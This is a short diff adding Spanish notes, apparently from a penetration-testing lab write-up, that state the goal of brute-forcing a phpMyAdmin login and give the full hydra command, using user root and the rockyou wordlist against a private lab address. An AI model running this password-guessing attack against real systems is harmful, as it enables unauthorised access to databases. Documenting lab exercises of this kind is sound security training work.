@@ -1,0 +1,5 @@
+Objetivo:** Obtener acceso al panel de administración phpMyAdmin mediante fuerza bruta
+herramienta:** hydra v9.7
+Comando utilizado:** 
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.233.128 http-form-post "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^:Login error"
